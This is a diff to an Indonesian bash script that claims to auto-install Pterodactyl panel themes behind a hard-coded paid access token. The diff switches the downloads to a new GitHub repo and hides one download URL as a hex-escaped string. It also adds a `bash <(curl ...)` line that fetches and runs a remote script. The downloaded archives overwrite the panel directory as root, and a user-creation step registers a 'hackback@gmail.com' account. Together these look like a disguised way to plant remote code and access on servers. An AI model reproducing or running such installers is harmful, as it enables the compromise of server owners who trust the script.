@@ -13,12 +13,12 @@ display_welcome() {
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
   echo -e "${BLUE}[+]                                                 [+]${NC}"
   echo -e "${BLUE}[+]                AUTO INSTALLER THEMA             [+]${NC}"
-  echo -e "${BLUE}[+]                  © danzzy                [+]${NC}"
+  echo -e "${BLUE}[+]                  ©DanzzyXCode                [+]${NC}"
   echo -e "${BLUE}[+]                                                 [+]${NC}"
   echo -e "${RED}[+] =============================================== [+]${NC}"
   echo -e ""
   echo -e "script ini di buat untuk mempermudah penginstalasian thema pterodactyle,"
-  echo -e "Dilarang Keras Share Bebas."
+  echo -e "dilarang keras untuk dikasih gratis."
   echo -e ""
   echo -e "𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 :"
   echo -e "@elkalah123"
@@ -32,19 +32,19 @@ display_welcome() {
 install_jq() {
   echo -e "                                                       "
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
-  echo -e "${BLUE}[+]             UPDATE & INSTALL JQ                 [+]${NC}"
+  echo -e "${BLUE}[+]             UPDATE & INSTALL SH                 [+]${NC}"
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
   echo -e "                                                       "
   sudo apt update && sudo apt install -y jq
   if [ $? -eq 0 ]; then
     echo -e "                                                       "
     echo -e "${GREEN}[+] =============================================== [+]${NC}"
-    echo -e "${GREEN}[+]              INSTALL JQ BERHASIL                [+]${NC}"
+    echo -e "${GREEN}[+]              INSTALL SH BERHASIL                [+]${NC}"
     echo -e "${GREEN}[+] =============================================== [+]${NC}"
   else
     echo -e "                                                       "
     echo -e "${RED}[+] =============================================== [+]${NC}"
-    echo -e "${RED}[+]              INSTALL JQ GAGAL                   [+]${NC}"
+    echo -e "${RED}[+]              INSTALL SH GAGAL                   [+]${NC}"
     echo -e "${RED}[+] =============================================== [+]${NC}"
     exit 1
   fi
@@ -56,20 +56,20 @@ install_jq() {
 check_token() {
   echo -e "                                                       "
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
-  echo -e "${BLUE}[+]               LICENSY RAFATHAR CODE            [+]${NC}"
+  echo -e "${BLUE}[+]               CREDITS DANZZY X CODE            [+]${NC}"
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
   echo -e "                                                       "
-  echo -e "${YELLOW}MASUKAN AKSES TOKEN :${NC}"
+  echo -e "${YELLOW}MASUKAN KODE TOKEN :${NC}"
   read -r USER_TOKEN
 
-  if [ "$USER_TOKEN" = "danzdevelop" ]; then
+  if [ "$USER_TOKEN" = "bandungistimewah" ]; then
     echo -e "${GREEN}AKSES BERHASIL${NC}}"
   else
-    echo -e "${GREEN}Token Salah! Beli Kode Token Di danzzy${NC}"
+    echo -e "${GREEN}Buy dulu Gih Ke DanzzyxCode X Marbles${NC}"
     echo -e "${YELLOW}TELEGRAM : @elkalah123${NC}"
-    echo -e "${YELLOW}WHATSAPP : +6282126803897${NC}"
+    echo -e "${YELLOW}WHATSAPP : 6282126803897${NC}"
     echo -e "${YELLOW}HARGA TOKEN : 25K FREE UPDATE JIKA ADA TOKEN BARU${NC}"
-    echo -e "${YELLOW}© danzzy${NC}"
+    echo -e "${YELLOW}©DanzzyxCode${NC}"
     exit 1
   fi
   clear
@@ -92,15 +92,15 @@ install_theme() {
     read -r SELECT_THEME
     case "$SELECT_THEME" in
       1)
-        THEME_URL=$(echo -e "https://github.com/danzzy1we/projek/raw/refs/heads/main/stellar.zip")        
+        THEME_URL=$(echo -e "https://github.com/gitfdil1248/thema/raw/main/C2.zip")
         break
         ;;
       2)
-        THEME_URL=$(echo -e "https://github.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/raw/main/billing.zip")
+        THEME_URL=$(echo -e "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x44\x49\x54\x5A\x5A\x31\x31\x32\x2F\x66\x6F\x78\x78\x68\x6F\x73\x74\x74\x2F\x72\x61\x77\x2F\x6D\x61\x69\x6E\x2F\x43\x31\x2E\x7A\x69\x70")
         break
         ;;
       3)
-        THEME_URL=$(echo -e "https://github.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/raw/main/enigma.zip")
+        THEME_URL=$(echo -e "https://github.com/gitfdil1248/thema/raw/main/C3.zip")
         break
         ;; 
       x)
@@ -133,7 +133,7 @@ if [ "$SELECT_THEME" -eq 1 ]; then
   php artisan migrate
   yarn build:production
   php artisan view:clear
-  sudo rm /root/stellar.zip
+  sudo rm /root/C2.zip
   sudo rm -rf /root/pterodactyl
 
   echo -e "                                                       "
@@ -161,7 +161,7 @@ elif [ "$SELECT_THEME" -eq 2 ]; then
   php artisan migrate
   yarn build:production
   php artisan view:clear
-  sudo rm /root/billing.zip
+  sudo rm /root/C1.zip
   sudo rm -rf /root/pterodactyl
 
   echo -e "                                                       "
@@ -203,7 +203,7 @@ elif [ "$SELECT_THEME" -eq 3 ]; then
   php artisan migrate
   yarn build:production
   php artisan view:clear
-  sudo rm /root/enigma.zip
+  sudo rm /root/C3.zip
   sudo rm -rf /root/pterodactyl
 
   echo -e "                                                       "
@@ -226,7 +226,7 @@ uninstall_theme() {
   echo -e "${BLUE}[+]                    DELETE THEME                 [+]${NC}"
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
   echo -e "                                                       "
-  bash <(curl https://raw.githubusercontent.com/VallzHost/installer-theme/main/repair.sh)
+  bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/repair.sh)
   echo -e "                                                       "
   echo -e "${GREEN}[+] =============================================== [+]${NC}"
   echo -e "${GREEN}[+]                 DELETE THEME SUKSES             [+]${NC}"
@@ -245,11 +245,10 @@ echo -e "${BLUE}[+] =============================================== [+]${NC}"
 echo -e "                                                                   "
 
 # Unduh file tema
-wget -O /root/stellar.zip https://github.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/raw/main/stellar.zip
-
+wget -O /root/C2.zip https://github.com/gitfdil1248/thema/raw/main/C2.zip
 
 # Ekstrak file tema
-unzip /root/stellar.zip -d /root/pterodactyl
+unzip /root/C2.zip -d /root/pterodactyl
 
 # Salin tema ke direktori Pterodactyl
 sudo cp -rfT /root/pterodactyl /var/www/pterodactyl
@@ -267,7 +266,7 @@ yarn build:production
 php artisan view:clear
 
 # Hapus file dan direktori sementara
-sudo rm /root/stellar.zip
+sudo rm /root/C2.zip
 sudo rm -rf /root/pterodactyl
 
 echo -e "                                                       "
@@ -400,7 +399,7 @@ cd /var/www/pterodactyl || { echo "Direktori tidak ditemukan"; exit 1; }
 # Membuat lokasi baru
 php artisan p:user:make <<EOF
 yes
-fixpanelhack@gmail.com
+hackback@gmail.com
 $user
 $user
 $user
@@ -448,22 +447,22 @@ check_token
 while true; do
   clear
   echo -e "                                                                     "
-  echo -e "${RED}        _,dnzdnzdnzd.                                     ${NC}"
-  echo -e "${RED}    ,dnzdnzdnzdnzdnzzx.                                   ${NC}"
-  echo -e "${RED}  ,dnzxz        dnzdnzzx.                                 ${NC}"
-  echo -e "${RED} ,dnz'               'dnz.                                ${NC}"
-  echo -e "${RED}',gg       ,dnz.      'dnz:                               ${NC}"
-  echo -e "${RED}'dnz      ,nz'''  .    dnz       Auto Installer danzzy   ${NC}"
-  echo -e "${RED}dnzg      nz     ,     dnz      ------------------------  ${NC}"
-  echo -e "${RED}dnz:     nz.     -   ,dnz       • Telegram : danzzy      ${NC}"
-  echo -e "${RED} dnz:     dnz._    _,dnz        • Creadit  : danzzy  ${NC}"
-  echo -e "${RED} dnz.    '.'''dnzdnzp           • Support by danzzy  ${NC}"
-  echo -e "${RED}  'dnz    '-.__                                           ${NC}"
-  echo -e "${RED}    dnz                                                   ${NC}"
-  echo -e "${RED}      dnz                                                 ${NC}"
-  echo -e "${RED}        dnz.                                              ${NC}"
-  echo -e "${RED}          dnz.                                            ${NC}"
-  echo -e "${RED}             b.                                           ${NC}"
+  echo -e "${BLUE}        _,gggggggggg.                                     ${NC}"
+  echo -e "${BLUE}    ,ggggggggggggggggg.                                   ${NC}"
+  echo -e "${BLUE}  ,ggggg        gggggggg.                                 ${NC}"
+  echo -e "${BLUE} ,ggg'               'ggg.                                ${NC}"
+  echo -e "${BLUE}',gg       ,ggg.      'ggg:                               ${NC}"
+  echo -e "${BLUE}'ggg      ,gg'''  .    ggg       Auto Installer DanzzyxCode Private   ${NC}"
+  echo -e "${BLUE}gggg      gg     ,     ggg      ------------------------  ${NC}"
+  echo -e "${BLUE}ggg:     gg.     -   ,ggg       • Telegram : t.me/elkalah123         ${NC}"
+  echo -e "${BLUE} ggg:     ggg._    _,ggg        • Creadit  : DANZZYXCODE ${NC}"
+  echo -e "${BLUE} ggg.    '.'''ggggggp           • Support by DanzzyxCode X Marbles ${NC}"
+  echo -e "${BLUE}  'ggg    '-.__                                           ${NC}"
+  echo -e "${BLUE}    ggg                                                   ${NC}"
+  echo -e "${BLUE}      ggg                                                 ${NC}"
+  echo -e "${BLUE}        ggg.                                              ${NC}"
+  echo -e "${BLUE}          ggg.                                            ${NC}"
+  echo -e "${BLUE}             b.                                           ${NC}"
   echo -e "                                                                     "
   echo -e "BERIKUT LIST INSTALL :"
   echo "1. Install theme"
@@ -505,11 +504,11 @@ while true; do
       ubahpw_vps
       ;;
     x)
-      echo "Keluar dari skrip bang."
+      echo "Keluar dari skrip."
       exit 0
       ;;
     *)
-      echo "Pilihan mu salah coba pilih prabowo."
+      echo "Pilihan tidak valid, silahkan coba lagi."
       ;;
   esac
 done
